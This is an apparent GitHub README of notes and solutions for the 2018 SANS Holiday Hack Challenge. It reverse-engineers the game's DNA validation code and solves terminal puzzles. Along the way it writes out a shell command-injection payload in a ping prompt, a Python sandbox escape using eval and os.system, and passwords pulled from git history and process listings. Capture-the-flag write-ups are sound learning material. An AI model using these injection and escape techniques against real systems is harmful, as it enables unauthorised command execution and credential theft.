# hhc2018

Notes on the holiday hack challenge.

# SPOILERS AHEAD
If you don't want the spoilers, please STOP READING now.

# Contact and contribution
- Clone, make a PR, good to go.
- Contact me at @imsonico over Twitter ;

# Dependencies:
- Nodejs: for CLI scripts to build DNAs

# DOM and sockets
This custom version of main.js contains a few upgrades.
- You can `console.log(functions)` and see the list of functions; so you can navegate it to find what they do.
- The WebSocket is exposed to the global scope. You can add event listeners, send messages, anything you can do with a socket.

# Basic setup you need
- Burp or ZAP Proxy; I use Burp. Any proxy which lets you manipulate WebSockets will do.
- Chromium browser configured to use your proxy as listed in the previous point.
- The Proxy SSL certificate installed in Chromium.
- Investigate how to use Sources Overrides in Chrome/Chromium
- Use `assets/kringlecon.com/main.js%3f9c4bcb0809532cd03df9` to override `main.js`


- Why Chromium? Because the Javascript debugger actually works and you'll need to debug Javascript code. Use the debugger!

# Gates
Things I've figured out:
- There's a DNA
- It can be manipulated by playing with WebSockets
- You can send a forged DNA, but still need to update the response from the server for the missingno. image to appear.

The Main.js file contains this snippet:

![Data lengths](docs/main001.png?raw=true "Data lengths")

From there you can infer the amount of characters used to encode the DNA. Note the interface limits the "torso" and "legs" options to 9 values: 0 to 8.
However the size specified in the JS says 8 letters. But each number is encoded in base 4:

![Number mapping](docs/main002.png?raw=true "Data mapping")

The interface lets you pick a number between 0 and 8:
```
- 0: AT AT
- 1: AT TA
- 2: AT GC
- 3: AT CG
- 4: TA AT
- 5: TA TA
- 6: TA GC
- 7: TA CG
- 8: GC AT
```

All these are using 4 characters, but we've seen above we can use up to 8; which means that `TA AT AT AT` (thus 64) would still be a valid "torso".



The DNA needs to contain the mapped numbers only. So AT, TA, CG, GC. There's a DNA listed [here](https://www.ncbi.nlm.nih.gov/Class/MLACourse/Modules/BLAST/q_jurassicparkDNA.html) which won't work because it contains non-accepted symbols, like TT.

The decoding function reads as follows:
```javascript
decodeDNASequence: e => b.unpack((e.match(/..?/g) || []).map(e => h[e]).join(""), 4),
```

Deobfuscated would be (not tested):

```javascript
decodeDNASequence: (e) => {

  const parts = (e.match(/..?/g) || []); // Maps becomes an array like [ ['AT'], ['AT'], ['TA'] ... ], 60 pairs of characters.
  const numbers = parts.map((pair) => { return h[pair]; }); // H is the list of mappings, see above. Now numbers became a list like [[0], [0], [1], ... ]
  const stringOfNumbers = numbers.join(""); // Glue them all together
  return b.unpack(stringOfNumbers, 4);  //
}
```

See [legs](assets/images/avatars/legs_full_boards.png?raw=true) and [torso](assets/images/avatars/torso_full_boards.png?raw=true) images. Both images include 3 additional transparent sections. It seems the options:

legs: 9, 10 11
torso: 9, 10, 11

Appear in the image, but are not available in the interface. The allowed values in the interface are 0 to 8.




* Interesting files
- There's a badge.png in images: https://kringlecon.com/images/badge.png


# DNA Validation

Here are a few deobfuscated functions. Original snippets:

```javascript
validateSequence(e) {
    if (!e)
        return g;
    if ("" == `${e}`)
        return g;
    if (!/((?:AT|TA|GC|CG){60})/i.test(e))
        return g;
    const t = b.getSize();
    if (e.length / 8 !== t)
        return g;
    const n = b.decodeDNASequence(e);
    return !!Object(i.filter)(n, (e,t)=>{
        if ("size" === t)
            return 0 > e || e >= d.length;
        if (Object(i.includes)(Object.keys(A), t))
            return 0 > e || e >= A[t].count;
        const n = Object(i.find)(c, {
            name: t
        });
        return !!n && (0 > e || e > parseInt(Array(n.size + 1).join("1"), 2).toString(10))
    }
    ).length && x
},

// [...]
 decodeDNASequence: e=>b.unpack( (e.match(/..?/g) || []) .map(e=>h[e]).join(""), 4)

// [...]
 unpack : (e, t = 16) {
     if ("string" != typeof e) return {
         error: "invalid format"
     };
     if (e.length < b.getSize()) return {
         error: "invalid input length"
     };
     let n = 0;
     return c.reduce((a, {
         name: o,
         size: i = 8
     }) => {
         const s = parseInt(e.slice(n, n + r(16 * i / 4 / t)), t);
         return n += r(16 * i / 4 / t), Object.assign({}, a, {
             [o]: s
         })
     }, {})
 },

```

And here they are deobfuscated:

```javascript
    validateSequence : (e) => {

        console.log("validateSequence : ", { g , x, e })

        if (!e){ return g; }
        if ("" == `${e}`){ return g; }
        if (!/((?:AT|TA|GC|CG){60})/i.test(e)){ return g; }

        const t = 15;  // b.getSize();  // t will always be 15, getSize is the SUM of all fields

        if (e.length / 8 !== 15){ return g; }   // The DNA must be 120 characters, not more not less

        const n = b.decodeDNASequence(e);

        const callback = (e,t)=>{
            // t is the field name (size, legs, eyes, etc)
            // e is the actual decimal value (0,1,2,...512?)

            if ("size" === t){
                if(0 > e){ return true; } // Size can not be less than 0
                if(e >= d.length){ return true; } // Size must be less than 2; d.length = 2
                return false;
            }

            // if (Object(i.includes)(Object.keys(A), t)) // the if condition is reworked below
            const validProperties = Object.keys(A);

            if (validProperties.includes(t)){
                if(0 > e){ return true; }           // e needs to be 0 or greater

                /* Counts are (kinda, look in main.js for exact code):
                    A = {
                        legs: { count: 9 },
                        torso: { count: 9 },
                        head: { count: 12 },
                        mouth: { count: 12 },
                        eyes: { count: 12 }
                    }
                 */

                if(e >= A[t].count){ return true; } // e needs to be less than the count of options for that item (eyes, mouth, etc)
                return false;
            }


            const n = Object(i.find)(c, {
                name: t
            });

            const condA = 0 > e;  // e needs to be positive

            let compar = Array(n.size + 1).join("1"); //
            compar = parseInt(compar, 2).toString(10);
            // For n.size = 4   => compar =     11111 => 31 => what if we send 32 ?
            // For n.size = 8   => compar = 111111111 => 511 => what if we send 512 ?
            // Response: it is validated

            const condB = e > compar;

            return !!n && (condA || condB);
        }

        const howManyValidFields = Object(i.filter)(n, callback).length;

        const toReturn = !!howManyValidFields && x
        return toReturn;

    },

     decodeDNASequence: (e) => {

        /* h is the mapping from letters to numbers :

        h = {   AT: "0",
                TA: "1",
                GC: "2",
                CG: "3" }         
        */

        const pairsOfLetters = e.match(/..?/g); // Now pairsOfLetters = [[AT], [AT], [TA], ... ]
        const dnaAsArray = pairsOfLetters || [];

        const callback = (e) => {
            if (e == 'AT') return 0;
            if (e == 'TA') return 1;
            if (e == 'GC') return 2;
            if (e == 'CG') return 3;
        }

        let toUnpack = dnaAsArray.map(callback);   // toUnpack is now [ 0, 0, 0 , 1, ... ]
        toUnpack = toUnpack.join(""); // toUnpack is a list of numbers
        return b.unpack(toUnpack , 4)
     }

    unpack(e, t = 16) {
        /* t = 4 as it's passed in the call above. It will always be 4 */

        if ("string" != typeof e) return {
            error: "invalid format"
        };

        const minSize = b.getSize(); // It is 15
        if (e.length < minSize) return {     
            error: "invalid input length"
        };

        let n = 0;

        let initialObject = {};

        return c.reduce(

            (a, { name: o, size: i = 8 }) => {

                /*
                o is one of eyes, mouth, head, etc... (name from below)
                i is the size from below

                var c = [
                { name: "size", size: 4 },
                { name: "legs", size: 8 },
                { name: "hue", size: 8 },
                { name: "torso", size: 8 },
                { name: "head", size: 8},
                { name: "saturation",size: 4 },
                { name: "mouth", size: 8 },
                { name: "eyes", size: 8 },
                { name: "brightness", size: 4 }];

                */

                const sectionLength =  r(16 * i / 4 / t); // this will be equal to i, so size as listed above.
                //  But still did not check for occurrences of unpack() with a different 2nd parameter (!= 4)

                const section = e.slice(n, n + sectionLength);  // Get i characters, starting from n

                const s = parseInt(section, t); // Convert the strings from base-4 to base-10

                // n += r(16 * i / 4 / t); // Reworked below to be readable.
                n = n + sectionLength;  // Move n to be i positions higher, to read the next number in the chain

                // Add the property to the a object, and return the object to be used in the next iteration
                // so it contains a list of properties.

                return Object.assign({}, a, {
                    [o]: s  
                })
        }, initialObject)
    },     

```


# Additional interesting Things
```javascript
isValidElement: c,
version: "16.5.0",
__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED: {
    ReactCurrentOwner: M,
    assign: g
}



url: !0,
week: !0
}
, ta = ar.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED  // And this?
, na = /^(.*)[\\\/]/
, ra = "function" == typeof Symbol && Symbol.for


__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED: {
    Events: [h, g, x, mr, w, function(e) {
        c(e, C)
    }
    , O, P, Te, A]
},


, function(e) {
    "use strict";
    // This is the function in index 80th
    e.exports = "SECRET_DO_NOT_PASS_THIS_OR_YOU_WILL_BE_FIRED"
}

```

# Game development


# Answers
1. Orientation challenge: 

_What phrase is revealed when you answer all of the questions at the KringleCon Holiday Hack History kiosk inside the castle? For hints on achieving this objective, please visit Bushy Evergreen and help him with the Essential Editor Skills Cranberry Pi terminal challenge._

Method: Watched the video at https://www.youtube.com/watch?v=31JsKzsbFUo and entered the answers.

Answer: Happy Trails

2. Directory Browsing:

Who submitted (First Last) the rejected talk titled Data Loss for Rainbow Teams: A Path in the Darkness? Please analyze the CFP site to find out. For hints on achieving this objective, please visit Minty Candycane and help her with the The Name Game Cranberry Pi terminal challenge.

3. de Bruijn Sequences
Method: enter the protected room. Talk to the elf. 
Answer: `Welcome unprepared speaker!`

## Terminals
* Exit vi (done): 
type `:q` and you're done.


* Minty Candycane Employee onboard (WIP)
1. First enter your information, and you'll see how the information is saved in a SQLite DB.
2. Use the "Test system" option and enter an IP. You'll notice it will ping.
3. Try to inject commands, so I've entered `127.0.0.1; ls ; ` and I've got this output:
```bash
Validating data store for employee onboard information.
Enter address of server: 127.0.0.1 ; ls -lah ;
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.036 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.043 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.043 ms

--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2048ms
rtt min/avg/max/mdev = 0.036/0.040/0.043/0.008 ms
total 5.4M
drwxr-xr-x 1 elf  elf  4.0K Dec 20 20:49 .
drwxr-xr-x 1 root root 4.0K Dec 14 16:17 ..
-rw-r--r-- 1 elf  elf   220 Aug 31  2015 .bash_logout
-rw-r--r-- 1 root root   95 Dec 14 16:13 .bashrc
drwxr-xr-x 3 elf  elf  4.0K Dec 20 20:46 .cache
drwxr-xr-x 3 elf  elf  4.0K Dec 20 20:47 .local
-rw-r--r-- 1 root root 3.8K Dec 14 16:13 menu.ps1
-rw-rw-rw- 1 root root  24K Dec 20 20:49 onboard.db
-rw-r--r-- 1 elf  elf   655 May 16  2017 .profile
-rwxr-xr-x 1 root root 5.3M Dec 14 16:13 runtoanswer
onboard.db: SQLite 3.x database

```
4. Now we'll need to find a way to explore that onboard.db SQLIte DB.
```bash
Validating data store for employee onboard information.
Enter address of server: 1.1.1.1; sqlite3 
connect: Network is unreachable
SQLite version 3.11.0 2016-02-15 17:29:24
Enter ".help" for usage hints.
Connected to a transient in-memory database.
Use ".open FILENAME" to reopen on a persistent database.
sqlite> .open onboard.db
sqlite> .tables
onboard
sqlite> .schema onboard
CREATE TABLE onboard (
    id INTEGER PRIMARY KEY,
    fname TEXT NOT NULL,
    lname TEXT NOT NULL,
    street1 TEXT,
    street2 TEXT,
    city TEXT,
    postalcode TEXT,
    phone TEXT,
    email TEXT
);
sqlite> select * from onboard where fname like 'Chan' OR lname LIKE 'Chan';
84|Scott|Chan|48 Colorado Way||Los Angeles|90067|4017533509|scottmchan90067@gmail.com
sqlite>```

5. The last step would be to run `runtoanswer`

```bash
Validating data store for employee onboard information.
Enter address of server: 1.1.1.1; runtoanswer
connect: Network is unreachable
Loading, please wait......



Enter Mr. Chan's first name: Scott


                                                                                
    .;looooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooool:'    
  'ooooooooooookOOooooxOOdodOOOOOOOdoxOOdoooooOOkoooooooxO000Okdooooooooooooo;  
 'oooooooooooooXMWooooOMMxodMMNKKKKxoOMMxoooooWMXoooookNMWK0KNMWOooooooooooooo; 
 :oooooooooooooXMWooooOMMxodMM0ooooooOMMxoooooWMXooooxMMKoooooKMMkooooooooooooo 
 coooooooooooooXMMMMMMMMMxodMMWWWW0ooOMMxoooooWMXooooOMMkoooookMM0ooooooooooooo 
 coooooooooooooXMWdddd0MMxodMM0ddddooOMMxoooooWMXooooOMMOoooooOMMkooooooooooooo 
 coooooooooooooXMWooooOMMxodMMKxxxxdoOMMOkkkxoWMXkkkkdXMW0xxk0MMKoooooooooooooo 
 cooooooooooooo0NXooookNNdodXNNNNNNkokNNNNNNOoKNNNNNXookKNNWNXKxooooooooooooooo 
 cooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo 
 cooooooooooooooooooooooooooooooooooMYcNAMEcISooooooooooooooooooooooooooooooooo
 cddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddo 
 OMMMMMMMMMMMMMMMNXXWMMMMMMMNXXWMMMMMMWXKXWMMMMWWWWWWWWWMWWWWWWWWWMMMMMMMMMMMMW 
 OMMMMMMMMMMMMW:  .. ;MMMk'     .NMX:.  .  .lWO         d         xMMMMMMMMMMMW 
 OMMMMMMMMMMMMo  OMMWXMMl  lNMMNxWK  ,XMMMO  .MMMM. .MMMMMMM, .MMMMMMMMMMMMMMMW 
 OMMMMMMMMMMMMX.  .cOWMN  'MMMMMMM;  WMMMMMc  KMMM. .MMMMMMM, .MMMMMMMMMMMMMMMW 
 OMMMMMMMMMMMMMMKo,   KN  ,MMMMMMM,  WMMMMMc  KMMM. .MMMMMMM, .MMMMMMMMMMMMMMMW 
 OMMMMMMMMMMMMKNMMMO  oM,  dWMMWOWk  cWMMMO  ,MMMM. .MMMMMMM, .MMMMMMMMMMMMMMMW 
 OMMMMMMMMMMMMc ...  cWMWl.  .. .NMk.  ..  .oMMMMM. .MMMMMMM, .MMMMMMMMMMMMMMMW 
 xXXXXXXXXXXXXXKOxk0XXXXXXX0kkkKXXXXXKOkxkKXXXXXXXKOKXXXXXXXKO0XXXXXXXXXXXXXXXK 
 .oooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo, 
  .looooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo,  
    .,cllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllc;.    
                                                                                

Congratulations!

onboard.db: SQLite 3.x database
Press Enter to continue...: ```




* Curl expert
1. It needs to be an HTTP2 request (so `CURL -X POST 127.0.0.1:8080 --http2`)
> `listen                  8080 http2`

2.The response might be an octet stream
`default_type application/octet-stream;`

3. By running `curl -X POST 127.0.0.1:8080 -v --http2-prior-knowledge`, I've got this message:

```bash
elf@657c12ef9fab:~$ curl -X POST 127.0.0.1:8080 -v --http2-prior-knowledge
* Rebuilt URL to: 127.0.0.1:8080/
*   Trying 127.0.0.1...
* TCP_NODELAY set
* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)
* Using HTTP2, server supports multi-use
* Connection state changed (HTTP/2 confirmed)
* Copying HTTP/2 data in stream buffer to connection buffer after upgrade: len=0
* Using Stream ID: 1 (easy handle 0x5650dd2ffdc0)
> POST / HTTP/1.1
> Host: 127.0.0.1:8080
> User-Agent: curl/7.52.1
> Accept: */*
> 
* Connection state changed (MAX_CONCURRENT_STREAMS updated)!
< HTTP/2 200 
< server: nginx/1.10.3
< date: Thu, 27 Dec 2018 20:47:59 GMT
< content-type: text/html; charset=UTF-8
< 
<html>
 <head>
  <title>Candy Striper Turner-On'er</title>
 </head>
 <body>
 <p>To turn the machine on, simply POST to this URL with parameter "status=on"

 
 </body>
</html>```

4. The command to run would be:
`curl -X POST 127.0.0.1:8080 -v --http2-prior-knowledge -d"status=on"`

5. Done! Response is:
```bash

-Holly Evergreen
<p>Congratulations! You've won and have successfully completed this challenge.
<p>POSTing data in HTTP/2.0.
```


* GDB Challenge
1-List, note you have gdb available.
2-Ran gdb 
3-Listed functions with (WIP)


* Tangle coalbox:
```bash
 Tangle Coalbox, ER Investigator
  Find the first name of the elf of whom a love poem 
  was written.  Complete this challenge by submitting 
  that name to runtoanswer.```
1.Looking around I've noticed this folder: /home/elf/.secrets/her
2. There's a text file which contains:


```bash
elf@d9378db2c95b:~/.secrets/her$ cat poem.txt 
Once upon a sleigh so weary, Morcel scrubbed the grime so dreary,
Shining many a beautiful sleighbell bearing cheer and sound so pure--
  There he cleaned them, nearly napping, suddenly there came a tapping,
As of someone gently rapping, rapping at the sleigh house door.
"'Tis some caroler," he muttered, "tapping at my sleigh house door--
  Only this and nothing more."

Then, continued with more vigor, came the sound he didn't figure,
Could belong to one so lovely, walking 'bout the North Pole grounds.
  But the truth is, she WAS knocking, 'cause with him she would be talking,
Off with fingers interlocking, strolling out with love newfound?
Gazing into eyes so deeply, caring not who sees their rounds.
  Oh, 'twould make his heart resound!

Hurried, he, to greet the maiden, dropping rag and brush - unlaiden.
Floating over, more than walking, moving toward the sound still knocking,
  Pausing at the elf-length mirror, checked himself to study clearer,
Fixing hair and looking nearer, what a hunky elf - not shocking!
Peering through the peephole smiling, reaching forward and unlocking:
  NEVERMORE in tinsel stocking!

Greeting her with smile dashing, pearly-white incisors flashing,
Telling jokes to keep her laughing, soaring high upon the tidings,
  Of good fortune fates had borne him.  Offered her his dexter forelimb,
Never was his future less dim!  Should he now consider gliding--
No - they shouldn't but consider taking flight in sleigh and riding
  Up above the Pole abiding?

Smile, she did, when he suggested that their future surely rested,
Up in flight above their cohort flying high like ne'er before!
  So he harnessed two young reindeer, bold and fresh and bearing no fear.
In they jumped and seated so near, off they flew - broke through the door!
Up and up climbed team and humor, Morcel being so adored,
  By his lovely NEVERMORE!

-Morcel Nougat
```

3.Looking around I've noticed there is a `.viminfo` file, which contains:
```bash


# hlsearch on (H) or off (h):
~h
# Last Substitute Search Pattern:
~MSle0~&Elinore

# Last Substitute String:
$NEVERMORE

# Command Line History (newest to oldest):
:wq
|2,0,1536607231,,"wq"
:%s/Elinore/NEVERMORE/g
|2,0,1536607217,,"%s/Elinore/NEVERMORE/g"
:r .secrets/her/poem.txt
|2,0,1536607201,,"r .secrets/her/poem.txt"
:q
|2,0,1536606844,,"q"
:w
|2,0,1536606841,,"w"
:s/God/fates/gc
|2,0,1536606833,,"s/God/fates/gc"
```

4.The name seems to be Elinore.
```bash

Who was the poem written about? Elinore


WWNXXK00OOkkxddoolllcc::;;;,,,'''.............                                 
WWNXXK00OOkkxddoolllcc::;;;,,,'''.............                                 
WWNXXK00OOkkxddoolllcc::;;;,,,'''.............                                 
WWNXXKK00OOOxddddollcccll:;,;:;,'...,,.....'',,''.    .......    .''''''       
WWNXXXKK0OOkxdxxxollcccoo:;,ccc:;...:;...,:;'...,:;.  ,,....,,.  ::'....       
WWNXXXKK0OOkxdxxxollcccoo:;,cc;::;..:;..,::...   ;:,  ,,.  .,,.  ::'...        
WWNXXXKK0OOkxdxxxollcccoo:;,cc,';:;':;..,::...   ,:;  ,,,',,'    ::,'''.       
WWNXXXK0OOkkxdxxxollcccoo:;,cc,'';:;:;..'::'..  .;:.  ,,.  ','   ::.           
WWNXXXKK00OOkdxxxddooccoo:;,cc,''.,::;....;:;,,;:,.   ,,.   ','  ::;;;;;       
WWNXXKK0OOkkxdddoollcc:::;;,,,'''...............                               
WWNXXK00OOkkxddoolllcc::;;;,,,'''.............                                 
WWNXXK00OOkkxddoolllcc::;;;,,,'''.............                                 

Thank you for solving this mystery, Slick.
Reading the .viminfo sure did the trick.
Leave it to me; I will handle the rest.
Thank you for giving this challenge your best.

-Tangle Coalbox
-ER Investigator

Congratulations!
```


* Pepper Minstix webmail hack terminal
```bash
  Submit the compromised webmail username to 
  runtoanswer to complete this challenge.```
  
  (WIP)
  
* Python escape terminal
1. Read


* Coalbox Dev Ops Failure terminal
1. Find Sparkle's password, then run the runtoanswer tool
2.`git log` shows the following entry, among others:
```bash
commit 60a2ffea7520ee980a5fc60177ff4d0633f2516b
Author: Sparkle Redberry <sredberry@kringlecon.com>
Date:   Thu Nov 8 21:11:03 2018 -0500

    Per @tcoalbox admonishment, removed username/password from config.js, default settings in config.js.def need to be updated before use
```
3.Go to `~/kcconfmgmt/server/config` to find `config.js.def`
4.`git log config.js.def` shows only one entry, checking out the previous version should do the trick. So check out `b2376f4a93ca1889ba7d947c2d14be9a5d138802` and see.
5.` git checkout b2376f4a93ca1889ba7d947c2d14be9a5d138802`
6. The file `server/config/config.js` contains:
```javascript
// Database URL
module.exports = {
    'url' : 'mongodb://sredberry:twinkletwinkletwinkle@127.0.0.1:27017/node-api'
};
```
7.`./runtoanswer`, enter `twinkletwinkletwinkle`
8.Read the nice poem:
```bash
This ain't "I told you so" time, but it's true:
I shake my head at the goofs we go through.
Everyone knows that the gits aren't the place;
Store your credentials in some safer space.
```

# Wunorse Openslae Samba terminal
1. Run `ps aux | more` to see all running processes:
```bash
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.0  17952  2868 pts/0    Ss   20:35   0:00 /bin/bash /sbin/init
root        10  0.0  0.0  45320  3164 pts/0    S    20:35   0:00 sudo -u manager /home/manag
er/samba-wrapper.sh --verbosity=none --no-check-certificate --extraneous-command-argument --do-not-run-as-tyler --accept-sage-advice -a 42 -d~ --ignore-sw-holiday-special --suppress --suppress //localhost/report-upload/ directreindeerflatterystable -U report-upload
root        11  0.0  0.0  45320  3152 pts/0    S    20:35   0:00 sudo -E -u manager /usr/bin/python /home/manager/report-check.py
root        15  0.0  0.0  45320  3056 pts/0    S    20:35   0:00 sudo -u elf /bin/bash
manager     16  0.0  0.0   9500  2600 pts/0    S    20:35   0:00 /bin/bash /home/manager/samba-wrapper.sh --verbosity=none --no-check-certificate --extraneous-command-argument --do-not
-run-as-tyler --accept-sage-advice -a 42 -d~ --ignore-sw-holiday-special --suppress --suppress //localhost/report-upload/ directreindeerflatterystable -U report-upload
manager     17  0.0  0.0  33848  7968 pts/0    S    20:35   0:00 /usr/bin/python /home/manager/report-check.py
elf         19  0.0  0.0  18204  3364 pts/0    S    20:35   0:00 /bin/bash
root        23  0.0  0.0 316664 15488 ?        Ss   20:35   0:00 /usr/sbin/smbd
root        24  0.0  0.0 308372  5888 ?        S    20:35   0:00 /usr/sbin/smbd
root        25  0.0  0.0 308364  4532 ?        S    20:35   0:00 /usr/sbin/smbd
root        27  0.0  0.0 316664  6064 ?        S    20:35   0:00 /usr/sbin/smbd
manager     37  0.0  0.0   4196   668 pts/0    S    20:37   0:00 sleep 60
elf         42  0.0  0.0  36636  2740 pts/0    R+   20:38   0:00 ps aux
elf         43  0.0  0.0   6420   916 pts/0    S+   20:38   0:00 more
```

2.Tried logged in as user `report-upload`:
`smbclient -U report-upload //localhost/report-upload/`

3.When asked for a password, entered `directreindeerflatterystable`

4.Got access to Samba share. Then run `put report.txt report.txt`. Seemed to work:
```bash
smb: \> put report.txt report.txt
putting file report.txt as \report.txt (250.5 kb/s) (average 250.5 kb/s)
smb: \> Terminated
elf@e167a3f21960:~$ 
                                                                               
                               .;;;;;;;;;;;;;;;'                               
                             ,NWOkkkkkkkkkkkkkkNN;                             
                           ..KM; Stall Mucking ,MN..                           
                         OMNXNMd.             .oMWXXM0.                        
                        ;MO   l0NNNNNNNNNNNNNNN0o   xMc                        
                        :MO                         xMl             '.         
                        :MO   dOOOOOOOOOOOOOOOOOd.  xMl             :l:.       
 .cc::::::::;;;;;;;;;;;,oMO  .0NNNNNNNNNNNNNNNNN0.  xMd,,,,,,,,,,,,,clll:.     
 'kkkkxxxxxddddddoooooooxMO   ..'''''''''''.        xMkcccccccllllllllllooc.   
 'kkkkxxxxxddddddoooooooxMO  .MMMMMMMMMMMMMM,       xMkcccccccllllllllllooool  
 'kkkkxxxxxddddddoooooooxMO   '::::::::::::,        xMkcccccccllllllllllool,   
 .ooooollllllccccccccc::dMO                         xMx;;;;;::::::::lllll'     
                        :MO  .ONNNNNNNNXk           xMl             :lc'       
                        :MO   dOOOOOOOOOo           xMl             ;.         
                        :MO   'cccccccccccccc:'     xMl                        
                        :MO  .WMMMMMMMMMMMMMMMW.    xMl                        
                        :MO    ...............      xMl                        
                        .NWxddddddddddddddddddddddddNW'                        
                          ;ccccccccccccccccccccccccc;                          
                                                                               



You have found the credentials I just had forgot,
And in doing so you've saved me trouble untold.
Going forward we'll leave behind policies old,
Building separate accounts for each elf in the lot.

-Wunorse Openslae
```


# Exit Python terminal

```bash
>>> os = eval('__im'+'port__("os")')
>>> os.system("killall python")
Use of the command os.system is prohibited for this question.
>>> exec
Use of the command exec is prohibited for this question.
>>> eval
<built-in function eval>
>>> eval('os.sy'+'stem("killall python")')
sh: 1: killall: not found
32512
>>> eval('os.sy'+'stem("ps | aux pyt")')
sh: 1: aux: not found
32512
>>> eval('os.sy'+'stem("ps aux | pyt")')
sh: 1: pyt: not found
32512
>>> eval('os.sy'+'stem("ps aux | grep pyt")')
elf          1  0.0  0.0  33840 11020 pts/0    Ss+  16:29   0:00 python3 /bin/shell
elf         15  0.0  0.0   4500   708 pts/0    S+   16:43   0:00 sh -c ps aux | grep pyt
elf         17  0.0  0.0  11280   960 pts/0    S+   16:43   0:00 grep pyt
0
>>> eval('os.sy'+'stem("./i_escaped")')
Loading, please wait......


 
  ____        _   _                      
 |  _ \ _   _| |_| |__   ___  _ __       
 | |_) | | | | __| '_ \ / _ \| '_ \      
 |  __/| |_| | |_| | | | (_) | | | |     
 |_|___ \__, |\__|_| |_|\___/|_| |_| _ _ 
 | ____||___/___ __ _ _ __   ___  __| | |
 |  _| / __|/ __/ _` | '_ \ / _ \/ _` | |
 | |___\__ \ (_| (_| | |_) |  __/ (_| |_|
 |_____|___/\___\__,_| .__/ \___|\__,_(_)
                     |_|                             


That's some fancy Python hacking -
You have sent that lizard packing!

-SugarPlum Mary
            
You escaped! Congratulations!

0
>>> 
```

# Yule Log Analysis
1.`ls` to find out the files in the current dir; then `python evtx_dump.py ho-ho-no.evtx > log.xml`
2. See the different events: `cat log.xml | grep EventID | sort | uniq -c | sort -rn` :
```bash
elf@64476099810b:~$ cat log.xml | grep EventID | sort | uniq -c | sort -rn
    756 <EventID Qualifiers="">4624</EventID>
    212 <EventID Qualifiers="">4625</EventID>
    109 <EventID Qualifiers="">4769</EventID>
    108 <EventID Qualifiers="">4776</EventID>
     45 <EventID Qualifiers="">4768</EventID>
     34 <EventID Qualifiers="">4799</EventID>
     10 <EventID Qualifiers="">4688</EventID>
      2 <EventID Qualifiers="">5059</EventID>
      2 <EventID Qualifiers="">4904</EventID>
      2 <EventID Qualifiers="">4738</EventID>
      2 <EventID Qualifiers="">4724</EventID>
      1 <EventID Qualifiers="">5033</EventID>
      1 <EventID Qualifiers="">5024</EventID>
      1 <EventID Qualifiers="">4902</EventID>
      1 <EventID Qualifiers="">4826</EventID>
      1 <EventID Qualifiers="">4647</EventID>
      1 <EventID Qualifiers="">4608</EventID>
```
  
2. What does each EventID mean?

4608: Windows is starting up
4624: An account was successfully logged on
4625: An account failed to log on
4647: User initiated logoff
4688: A new process has been created
4724: An attempt was made to reset an accounts password
4738: A user account was changed
4768: A Kerberos authentication ticket (TGT) was requested
4769: A Kerberos service ticket was requested
4776: The domain controller attempted to validate the credentials for an account
4826: Boot Configuration Data loaded
4902: The Per-user audit policy table was created
4904: An attempt was made to register a security event source
5024: The Windows Firewall Service has started successfully
5033: The Windows Firewall Driver has started successfully
5059: Key migration operation

3. The events `4738`, `4724` seem to be interesting, an account was changed and a password change attempts was issued. What does this event say?
4. The events `4624` and `4625` are interesting too. Run this command to see what happened with some events:
```bash
grep -E "4625|4624" log.xml -A 20 | grep -E "EventID|TargetUserName"  | grep -v HealthMailbox | grep -E "462|Data"
```

5. So I'll look for many `4625` followed by a `4624`; which points to:
`<Data Name="TargetUserName">minty.candycane</Data>`
6. Try `minty.candycane` as an answer:

```bash
Silly Minty Candycane, well this is what she gets.
"Winter2018" isn't for The Internets.
Passwords formed with season-year are on the hackers' list.
Maybe we should look at guidance published by the NIST?
Congratulations!
```


## Challenges:


# Find the name of the rejected talk
The challenge name aims to "Directory something"; which seems to be a hint to look for hidden directories. Tried /.git and /.svn  but did not found anything. So...

1. Visit the site https://cfp.kringlecastle.com
2. Use DirBuster to find more directories: `docker run --rm hypnza/dirbuster -u https://cfp.kringlecastle.com/`
3. You'll notice there's a /cfp/cfp.html file, but there's also a /cpf/ directory. Such directory had an open listing.
4. Click on `https://cfp.kringlecastle.com/cfp/rejected-talks.csv`
5. Find the record for `Data Loss for Rainbow Teams: A Path in the Darkness`, the answer is `John,McClane`


# Enter the Code to Unlock the Door
1. Characters are: Triangle, Square, Circle and Star.
2. 4 characters * 4 positions = 4^4 = 256 options
3. Get the de Brujin sequence:
`0 0 0 0 1 0 0 0 2 0 0 0 3 0 0 1 1 0 0 1 2 0 0 1 3 0 0 2 1 0 0 2 2 0 0 2 3 0 0 3 1 0 0 3 2 0 0 3 3 0 1 0 1 0 2 0 1 0 3 0 1 1 1 0 1 1 2 0 1 1 3 0 1 2 1 0 1 2 2 0 1 2 3 0 1 3 1 0 1 3 2 0 1 3 3 0 2 0 2 0 3 0 2 1 1 0 2 1 2 0 2 1 3 0 2 2 1 0 2 2 2 0 2 2 3 0 2 3 1 0 2 3 2 0 2 3 3 0 3 0 3 1 1 0 3 1 2 0 3 1 3 0 3 2 1 0 3 2 2 0 3 2 3 0 3 3 1 0 3 3 2 0 3 3 3 1 1 1 1 2 1 1 1 3 1 1 2 2 1 1 2 3 1 1 3 2 1 1 3 3 1 2 1 2 1 3 1 2 2 2 1 2 2 3 1 2 3 2 1 2 3 3 1 3 1 3 2 2 1 3 2 3 1 3 3 2 1 3 3 3 2 2 2 2 3 2 2 3 3 2 3 2 3 3 3 3 (0 0 0) `
4. Convert it to a Javascript array:
```javascript
